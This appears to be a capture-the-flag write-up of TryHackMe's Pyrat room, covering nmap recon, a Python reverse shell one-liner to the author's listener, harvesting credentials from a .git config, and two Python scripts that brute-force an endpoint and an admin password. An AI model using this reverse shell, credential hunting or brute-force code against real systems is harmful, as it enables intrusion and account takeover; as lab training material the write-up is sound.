---
title: Pyrat writeup
difficulty: Easy
author: 0xray1e
date: 2026-03-02T17:31:00.000+03:00
description: A walkthrough of TryHackMe's boot-to-root Pyrat room.
categories:
  - Boot to Root
  - TryHackMe
tags: []
---
## Room Description

[Pyrat room in TryHackMe](https://tryhackme.com/room/pyrat)

Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.

## Recon

First, I started with an nmap scan.

```
nmap -Pn -T4 10.67.166.0
```

![TCP ports nmap scan](/assets/img/uploads/Pasted image 20260221151604.png "TCP ports nmap scan")

This returned port 22 used for ssh and port 8000 for HTTP. I ran a script on the http port to get more information on what was running there.

```
nmap -sC -sV -p8000 10.67.166.0
```

![port 8000 nmap scan](/assets/img/uploads/Pasted image 20260221151729.png "port 8000 nmap scan")

The above response showed that this is a Python server. I started a netcat connection to access the server.

```
nc 10.67.175.146 8000
```

## Initial Acess

Trying to do directory listing did not help, but after some exploring, I realised that the server can execute Python code.

![python command](/assets/img/uploads/Pasted image 20260221174142.png "python command")

Using this, I spawned a Python-based reverse shell.

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.141.57",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

Listened on port 4444 on my machine.

```
nc -nvlp 4444
```

Once the shell is spawned and after some exploring, I found myself in the `var` directory where I could read the contents of `mail.` 

![email conten](/assets/img/uploads/Pasted image 20260221182446.png "email content")

## User Access

The email is from `root`user to `think` referring to a RAT installed from Think's GitHub page. I decided to check whether there was a .git folder in the system. This led me to `/opt/dev/.git`. A .git folder stores everything needed to track changes made to a project. This includes a config file which contains email aliases, name, authentication credentials, a log of all the commits made, git objects (a hash key pointing to a commit), etc.

`/opt/dev/.git/config` file has Think's credentials, which I used to log in and obtain the user flag.

![Think's credentials](/assets/img/uploads/Pasted image 20260224135920.png "Think's credentials")

![login as Think](/assets/img/uploads/Pasted image 20260224140020.png "Think login")

Get user.txt

![user.txt flag](/assets/img/uploads/Pasted image 20260224140145.png "user.txt flag")

Now that I had permissions, I was curious to know what was in the git project. This is where the [git objects](https://git-scm.com/book/en/v2/Git-Internals-Git-Objects.html) come in handy. An object is basically a hashed key which points to a commit. These objects can be found in the objects folder, where the full object is the folder name plus the key inside it. For example, in this case, the full object key is `0a3c36d66369fd4b07ddca72e5379461a63470bf`. 

![objects folder](/assets/img/uploads/git objects folder.png "objects folder")

![object key](/assets/img/uploads/object key.png "object key")

The object can also be found in `HEAD` which points to the current working branch of the project. In our case, `HEAD`points to `refs/heads/master`. This is where the key pointing to the latest commit is. 

![latest commit](/assets/img/uploads/Pasted image 20260224151521.png "latest commit")

With this key, we can retrieve the source code.

```
git cat-file -p <object>
```

![view source](/assets/img/uploads/Pasted image 20260224151754.png "view source")

This gives us the key pointing to the repo. We do the same with the tree key, and this give as list of applications in that repository.

![list project folders](/assets/img/uploads/Pasted image 20260224151834.png "list project folders")

We have the key for pyrat.py.old, let's see what this contains.

![pyrat.py.old script](/assets/img/uploads/Pasted image 20260224151942.png "pyrat.py.old script")

## Pyrat.old.py

```
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e
```

There is a http server that waits for user input. You can connect to the server using netcat.

The script checks whether the input entered in netcat is exactly `some endpoint` then it gets a response and sends it back. 

```
if data == 'some_endpoint':
        get_this_enpoint(client_socket)
```

If the input sent is anything else, the uid of the socket is checked and if it is 0(root), it is downgraded. 

```
 uid = os.getuid()
        if (uid == 0):
            change_uid()
```

If the user inputs shell, a shell is spawned (with low privileges). If any other input is provided, it is executed as Python code.

```
if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)
```

I tried out some of these functionalities, but entering `some_endpoint` did not work. 

![pyrat.py.old script functionality](/assets/img/uploads/Pasted image 20260224152223.png "pyrat.py.old script functionality")

This is probably because the script is an old version of the current one. The room description had, however, told us that we had to fuzz some endpoints, so that is what I did.

## Username and Password fuzzing

This script, which I created with the help of ChatGPT, takes a username wordlist and tests it while checking the output. If the output does not contain 'name', then it assumes the right username has been found, and it prints it.

```
import socket
import sys

def fuzz_endpoints(target_ip, target_port, wordlist_path):
    try:
        with open(wordlist_path, 'r') as f:
            endpoints = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[-] Error: Wordlist '{wordlist_path}' not found.")
        return

    print(f"[*] Starting fuzzing on {target_ip}:{target_port}...")
    
    for word in endpoints:
        try:
            # Create a new socket for each attempt
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2) # Don't hang forever
            s.connect((target_ip, target_port))

            # Send the word without a newline (simulating echo -n)
            s.sendall(word.encode())

            # Receive the response
            response = s.recv(1024).decode(errors='ignore')

            # Check logic: if 'name' is NOT in the response, we found something interesting
            if "name" not in response.lower() and response != "":
                print(f"[!] POTENTIAL ENDPOINT FOUND: {word}")
                print(f"[>] Server Response: {response}")
            else:
                # Optional: print progress
                print(f"[-] Tried: {word} (Failed)", end='\r')

            s.close()
        except Exception as e:
            print(f"\n[!] Error connecting with '{word}': {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 fuzzer.py <wordlist.txt>")
    else:
        fuzz_endpoints("10.67.142.167", 8000, sys.argv[1]) ## replace IP address
```

Since this is an easy room, I used a small wordlist.

![fuzzer.py](/assets/img/uploads/Pasted image 20260224153144.png "fuzzer.py")

Now that we know the username is admin, we need to find the password.

I modified the same script to take a list of passwords, and if the word "password" is not in the output, then the correct password has been found, and output the password. Every request is sent in a new connection to avoid running out of trials.

```
import socket
import sys
import time

def fuzz_password(target_ip, target_port, endpoint, wordlist_path):
    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[-] Error: Wordlist '{wordlist_path}' not found.")
        return

    print(f"[*] Starting password fuzzing on {target_ip}:{target_port}")
    print(f"[*] Success criteria: Server stops sending 'Password:' prompt.")

    for password in passwords:
        try:
            # New connection for every attempt to reset the 3-try counter
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target_ip, target_port))

            # Step 1: Trigger the 'admin' endpoint
            s.sendall(endpoint.encode())
            
            # Catch the first 'Password:' prompt
            initial_prompt = s.recv(1024).decode(errors='ignore')
            
            if "Password:" in initial_prompt:
                # Step 2: Send the password with a newline
                s.sendall((password + "\n").encode())
                
                # Step 3: Capture the server's reaction
                # If the password is wrong, it sends 'Password:' again.
                # If it's right, it sends something else.
                result = s.recv(1024).decode(errors='ignore')

                if "Password:" not in result and result != "":
                    print(f"\n[!] SUCCESS! Password likely found: {password}")
                    print(f"[>] Server Output: {result}")
                    s.close()
                    return
                else:
                    print(f"[-] Tried: {password} (Incorrect - Prompted again)", end='\r')
            
            s.close()
            # Minimal delay to ensure the OS releases the socket
            time.sleep(0.05)

        except Exception as e:
            # If the connection drops immediately after a password, 
            # that might also indicate a successful login or a specific crash.
            print(f"\n[!] Connection closed/error after trying '{password}': {e}")
            continue

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 pass_fuzzer.py <passwords.txt>")
    else:
        fuzz_password("10.67.142.167", 8000, "admin", sys.argv[1])

```



![pass_fuzzer.py](/assets/img/uploads/Pasted image 20260224154650.png "pass_fuzzer.py")

This got me the password.

`abc123`

## Root Access

Log in and get the root flag.

![root access](/assets/img/uploads/Pasted image 20260224154719.png "root access")

root flag

![root flag](/assets/img/uploads/Pasted image 20260224154758.png "root flag")
